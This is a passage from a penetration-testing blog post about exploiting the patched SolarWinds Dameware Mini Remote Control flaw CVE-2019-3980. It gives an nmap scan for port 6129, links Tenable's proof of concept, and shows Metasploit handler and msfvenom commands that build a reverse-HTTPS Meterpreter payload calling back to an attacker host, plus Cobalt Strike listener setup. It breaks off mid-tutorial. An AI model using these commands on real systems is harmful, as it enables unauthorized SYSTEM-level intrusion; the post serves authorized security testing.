---
title: Dameware Mini: The Sleeper Hit of 2019?
url: https://www.trustedsec.com/blog/dameware-mini-the-sleeper-hit-of-2019/
source: TrustedSec
date: 2022-10-19
fetch_date: 2025-10-03T20:18:28.239974
---

# Dameware Mini: The Sleeper Hit of 2019?

[Skip to Main Content](#main)

All Trimarc services are now delivered through TrustedSec!
[Learn more](https://trustedsec.com/about-us/news/trimarc-joins-forces-with-trustedsec-to-strengthen-security-advisory-services)

Close

[TrustedSec](https://trustedsec.com/)

* [Solutions](https://trustedsec.com/solutions)

  ## Solutions

  Our custom solutions are tailored to address the unique challenges of different roles in security.

  [Solutions](https://trustedsec.com/solutions)

  + [01

    For Leadership

    We understand the challenges facing modern executives and develop solutions unique to leaders.](https://trustedsec.com/solutions/for-leadership)
  + [02

    For Operations

    We stay one step ahead to proactively safeguard our clients and partners.](https://trustedsec.com/solutions/for-operations)
  + [03

    For Infrastructure

    From architecture to resiliency and maintainability, we keep your tech aligned to best practices.](https://trustedsec.com/solutions/for-infrastructure)
  + [04

    For Assurance

    Our compliance experts guide partners through regulatory requirements to ensure standards are met.](https://trustedsec.com/solutions/for-assurance)
* [Services](https://trustedsec.com/services)

  ## Services

  From building to testing to hardening, our services support security at every stage.

  [Services](https://trustedsec.com/services)

  + [01

    Design

    Design an exceptional, custom security program alongside our security experts.](https://trustedsec.com/services/design)
  + [02

    Evaluate

    Evaluate your security program with proven assessment methodologies.](https://trustedsec.com/services/evaluate)
  + [03

    Harden

    Harden your security program with the help of our security experts.](https://trustedsec.com/services/harden)
  + [04

    Respond

    Respond to threats to your security program with the help of our security experts.](https://trustedsec.com/services/respond)
* [Research](https://trustedsec.com/research)
* [Blog](https://trustedsec.com/blog)
* [Resources](https://trustedsec.com/resources)
* [About Us](https://trustedsec.com/about-us)

  ## About Us

  Driven by purpose, fueled by experts.

  [About Us](https://trustedsec.com/about-us)

  + [01

    Our Team

    Meet our security experts.](https://trustedsec.com/about-us/our-team)
  + [02

    Our Partners

    Become a TrustedSec partner to help your customers anticipate and prepare for potential attacks.](https://trustedsec.com/about-us/our-partners)
  + [03

    News

    Our team is trusted by local and national media to be the subject matter experts for security news.](https://trustedsec.com/about-us/news)
  + [04

    Events

    See our upcoming webinars, conferences, talks, trainings, and more!](https://trustedsec.com/about-us/events)

Search

Menu

Search Input

Search

* [Contact Us](https://trustedsec.com/contact)
* [Report a breach](https://trustedsec.com/report-a-breach)

* [Solutions](https://trustedsec.com/solutions)
* [Services](https://trustedsec.com/services)
* [Research](https://trustedsec.com/research)
* [Blog](https://trustedsec.com/blog)
* [Resources](https://trustedsec.com/resources)
* [About Us](https://trustedsec.com/about-us)

Search

* [Contact Us](https://trustedsec.com/contact)
* [Report a breach](https://trustedsec.com/report-a-breach)

* [Blog](https://trustedsec.com/blog)
* [Dameware Mini: The Sleeper Hit of 2019?](https://trustedsec.com/blog/dameware-mini-the-sleeper-hit-of-2019)

October 18, 2022

# Dameware Mini: The Sleeper Hit of 2019?

Written by
David Boyd

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/DamewareMiniExploitation_WebHero.jpg?w=320&h=320&q=90&auto=format&fit=crop&dm=1695576188&s=705144bc3af68d8b8bed8b0b575cbc38)

Share

* Share URL
* [Share via Email](/cdn-cgi/l/email-protection#c1feb2b4a3aba4a2b5fc82a9a4a2aae4f3f1aeb4b5e4f3f1b5a9a8b2e4f3f1a0b3b5a8a2ada4e4f3f1a7b3aeace4f3f195b3b4b2b5a4a592a4a2e4f3f0e7a0acb1faa3aea5b8fc85a0aca4b6a0b3a4e4f3f18ca8afa8e4f280e4f3f195a9a4e4f3f192ada4a4b1a4b3e4f3f189a8b5e4f3f1aea7e4f3f1f3f1f0f8e4f287e4f280e4f3f1a9b5b5b1b2e4f280e4f387e4f387b5b3b4b2b5a4a5b2a4a2efa2aeace4f387a3adaea6e4f387a5a0aca4b6a0b3a4ecaca8afa8ecb5a9a4ecb2ada4a4b1a4b3eca9a8b5ecaea7ecf3f1f0f8 "Share via Email")
* [Share on Facebook](http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fdameware-mini-the-sleeper-hit-of-2019 "Share on Facebook")
* [Share on X](http://twitter.com/share?text=Dameware%20Mini%3A%20The%20Sleeper%20Hit%20of%202019%3F%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fdameware-mini-the-sleeper-hit-of-2019 "Share on X")
* [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fdameware-mini-the-sleeper-hit-of-2019&mini=true "Share on LinkedIn")

SolarWinds! You hear the name and immediately think “solutions management” or big screens full of more network information than you can shake a stick at. SolarWinds has been on the scene since 1999, and their products and solutions can be found in networks worldwide.

SolarWinds Dameware Mini Remote Control is one such offering. On the website, it's described as “affordable remote control software for all your customer support and help desk needs.” Sounds pretty handy, right?

Well, Tenable discovered a nifty little flaw in a version released in 2019. You see, the Dameware Mini Remote Client agent supports smart card authentication *by default.* This allows a user to upload an executable on a host where the SolarWinds Dameware Remote Mini Remote Client Agent Service (DWRCS.exe) is running. The cool thing about that particular service? It runs as *SYSTEM.*

So, Tenable completes the responsible disclosure, whips up [this awesome POC](https://github.com/tenable/poc/tree/master/Solarwinds/Dameware), and you get a [nice little CVE](https://www.tenable.com/cve/CVE-2019-3980) to boot. SolarWinds patches the vulnerability, and all is right again.

Alright, so why am I writing about a vulnerability that is almost 4 years old?

![](https://www.trustedsec.com/wp-content/uploads/2022/10/boyd1.jpg)

Because I still see it all the time, and it has provided me footholds on several gigs over the years. IT admins will patch SolarWinds but forget to patch the Client Agent Service. Well, let’s get some shells! Exploiting this is straightforward.

## **Enumeration**

First, let’s look for hosts that have port 6129 open. Port 6129 is where the Dameware service typically runs. Nmap or Masscan work well for this, but I am also privy to SpooNMAP. (Shameless plug [here](https://github.com/trustedsec/spoonmap).)

```
<em>nmap -sV -g88 -p6129  --open</em>
```

![](https://www.trustedsec.com/wp-content/uploads/2022/10/boyd2.png)

Figure 2 - Dameware Service Running, Check

OK! We have a possible hit. Dameware service is running, and the port is open.

## **The Setup**

We need three parts for the next step: the POC mentioned above, an executable, and a handler (to catch your payload). For this blog, I’ll demonstrate Metasploit and Cobalt Strike.

Grab your POC:

<https://github.com/tenable/poc/tree/master/Solarwinds/Dameware>

Start your MSF handler/CS listener:

### **Metasploit:**

```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set LHOST <IP>; set LPORT 443; exploit -j"
```

### **Cobalt Strike:**

```
./teamserver <IP> <Password> <awesome profile>
```

Cobalt Strike > Listeners > Add

![](https://www.trustedsec.com/wp-content/uploads/2022/10/boyd3.png)

Figure 3 - Setting Up Cobalt Strike Listener

Generate your executable:

### **Metasploit:**

```
sudo msfvenom -p windows/meterpreter_reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f exe > test.exe
```

![](https://www.trustedsec.com/wp-content/uploads/2022/10/boyd4.png)

Figure 4 - Meterpreter Payload Generated

### **Cobalt Strike:**

Payloads > Windows Stageless Payloads > Listener > Generate

![](https://www.trustedsec.com/wp-conten...